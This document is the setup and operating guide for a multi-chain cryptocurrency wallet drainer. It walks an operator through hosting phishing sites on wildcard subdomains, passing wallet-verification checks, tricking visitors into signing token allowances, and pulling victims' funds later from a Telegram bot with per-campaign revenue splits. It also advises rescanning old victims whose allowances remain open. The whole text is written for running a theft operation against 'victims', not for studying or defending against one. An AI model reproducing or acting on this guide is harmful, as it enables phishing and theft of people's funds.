# Setup

Approve-first, pull-later multi-chain drainer. Victims grant an allowance during their visit; you pull later from Telegram whenever you choose. Nothing leaves their wallet while they're on the site.

---

## What you need first

- A domain you control, with DNS at Cloudflare
- A Telegram account and a bot from @BotFather
- A free Render account - your own, 750 free hours are per workspace
- A free Reown account at dashboard.reown.com
- A free Alchemy account at dashboard.alchemy.com
- Node.js 20+ locally
- About $50 of seed gas spread across chains

Everything runs on free tiers. Gas is the only real cost.

---

## 1. Wallet

Make the destination wallet in Trust Wallet. Do not generate it from a command - you want the 12-word recovery phrase.

1. Install Trust Wallet and create a NEW wallet, separate from your personal one
2. Write the 12-word recovery phrase down on paper, offline. Not in the repo, not in a note on the same phone
3. Copy the Ethereum receive address
4. Copy the Solana address from the same wallet
5. Copy the Bitcoin address from the same wallet
6. Export the Ethereum private key: open the wallet, tap the three dots, Show Recovery Phrase / Export Private Key
7. Paste the private key into DRAINER_PRIVATE_KEY, and the three addresses into DRAINER_EVM_ADDRESS, DRAINER_SOL_ADDRESS and DRAINER_BTC_ADDRESS

Only the EVM private key goes in .env. Solana and Bitcoin are signed by the victim at connect, so those need addresses only.

Fund the Ethereum address with native gas on every chain you want to drain. Send to the same address on each chain - same address, different network:

  Ethereum    $30
  BNB Chain   $5
  Base        $3
  Arbitrum    $3
  Optimism    $3
  Polygon     $2
  Avalanche   $3

Never drain a chain to zero. The gas guard skips chains where the balance is too thin.

Keep the recovery phrase. If the private key is ever lost or leaked, that phrase is the only way back in, and it is also the only way to move funds to a clean wallet without paying to sweep chain by chain.

---

## 2. Telegram bot

1. Message @BotFather, send /newbot, pick a name and username
2. Copy the token
3. Make one group per campaign, add the bot to each
4. In each group send /start - the bot replies with the chat ID
5. Put those IDs in .env

Group IDs are negative and start with -100. A positive number means you grabbed a user, not a group.

---

## 3. Alchemy

Create an app at dashboard.alchemy.com and enable every chain you plan to drain. Copy the key into ALCHEMY_KEY.

Without it, discovery falls back to the hardcoded USDT/USDC list and you miss everything else. Public RPC fallbacks are in .env so the app still runs, but discovery is much weaker.

Free tier is 300M compute units a month. Plenty of volume, but requests are rate-limited - don't share one key across operators.

---

## 4. Reown

Create a project at dashboard.reown.com and copy the project ID into WALLETCONNECT_PROJECT_ID.

Then under Verify - allowed origins, add every hostname you'll serve from. Exact match, https://, no trailing slash:

  https://yourdomain.com
  https://www.yourdomain.com
  https://ab.yourdomain.com

Subdomains do not inherit from the apex. Every new one needs its own entry, or the wallet shows a red "Cannot verify" badge.

Set WALLETCONNECT_VERIFY to the verification string the dashboard gives you.

Free tier is 2.5M RPC calls a month and it cuts off at the limit rather than billing overage.

---

## 5. .env

Copy .env.example to .env and fill everything.

PORT=3000
CORS_ORIGIN=*

APP_NAME=Your App Name
APP_DESC=Short description shown in the wallet modal
APP_URL=https://yourdomain.com
APP_ICON=https://yourdomain.com/icon.png

WALLETCONNECT_PROJECT_ID=
WALLETCONNECT_VERIFY=

ALCHEMY_KEY=

DRAINER_PRIVATE_KEY=0x...
DRAINER_EVM_ADDRESS=0x...
DRAINER_SOL_ADDRESS=
DRAINER_BTC_ADDRESS=

APPROVE_MODE=true
APPROVE_ONLY=true

CHAT_MAIN=
CHAT_AB=

APPROVE_MODE=true and APPROVE_ONLY=true are what make this approve-first. Change either and it becomes an instant drainer with no later pull.

---

## 6. campaigns.js

One entry per campaign. The key is the exact hostname the victim visits.

module.exports = {
  'yourdomain.com': {
    label: 'MAIN',
    shares: { YOU: 1 },
    evm: EVM, sol: SOL, btc: BTC,
    chatId: process.env.CHAT_MAIN,
  },
  'ab.yourdomain.com': {
    label: 'AB',
    shares: { A: 0.5, B: 0.5 },
    evm: EVM, sol: SOL, btc: BTC,
    chatId: process.env.CHAT_AB,
  },
};

- label appears on every Telegram message
- shares only feeds the /stats split display
- The first entry is the fallback for any unmatched host - make it your main domain
- Campaigns can share one wallet; only the chat differs

---

## 7. DNS

In Cloudflare:

Type: CNAME   Name: *   Target: your-service.onrender.com   Proxy: ON

In Render, your service, Custom Domains, add your apex and one wildcard:

  yourdomain.com
  *.yourdomain.com

Render will show validation records. Add them in Cloudflare as DNS only (grey cloud) - proxying them breaks verification. Leave those grey permanently; the * record can be orange.

Delete any AAAA records.

SSL/TLS mode must be Full or Full (strict). Flexible loops against Render.

---

## 8. Deploy

Push to a private repo, create a Render Web Service:

  Build:              npm install
  Start:              npm start
  Health check path:  /health

Free services sleep after 15 idle minutes and take about a minute to wake. Put a free UptimeRobot monitor on https://yourdomain.com/health every 5 minutes, or victims hit a blank page.

---

## 9. Test

1. Connect a throwaway wallet on a test campaign
2. Confirm the ping lands in the correct group only, with the label
3. Approve one token, confirm nothing moves and the allowance exists on the explorer
4. Press Drain now, confirm the transfer and the ledger entry
5. Send /stats

Expect about five approve prompts per chain plus one native send. That is normal.

---

## Operating

Drain now is manual per wallet. Nothing auto-drains - the site only approves. Tokens stay in the victim's wallet until you press it.

/stats    prints per-campaign totals and the split
/wallets  lists the last ten wallets seen with rescan and drain buttons
/gas      shows your EOA balance per chain

Rescan old wallets periodically. Allowances are permanent, so anyone who tops up is pullable again.

---

## Limits

- Exchange-held crypto is unreachable - no wallet, no signature
- Native coins are one-shot, swept at connect with no allowance
- Solana and Bitcoin are one-shot for the same reason
- BTC only works with Unisat, and with Xverse if you add it
- No NFT support
- Staked and LP positions are unreachable
- MAX_TOKENS_PER_CHAIN = 5 caps approve prompts; tokens ranked sixth and below never get approved
- Victims pay approve gas - roughly $1-3 per token on Ethereum, cents elsewhere
- events.json and drains.csv live on Render's ephemeral disk and reset on deploy; the Telegram chat history is the durable record

---

## Troubleshooting

Connect spins forever on a subdomain
  The hostname isn't in the Reown allowlist, or "block unverified origins" is on.

"Cannot verify" badge
  Same cause.

Telegram sends nothing
  The bot isn't in the group, the chat ID is wrong, or /start was never sent.

Everything 502s
  The service is down. Check Render logs.

not-approved on drain
  No allowance was signed for that token. They declined, or they connected before APPROVE_MODE was set.

no-gas on drain
  The destination wallet is short on that chain.

Discovery returns nothing
  Alchemy key invalid, or the app isn't enabled for that chain.

---

## Trust

Whoever holds the private keys can move all funds at any time. State that plainly up front. Separate destination wallets per partner removes the problem; a single shared wallet means settlement depends on the key holder.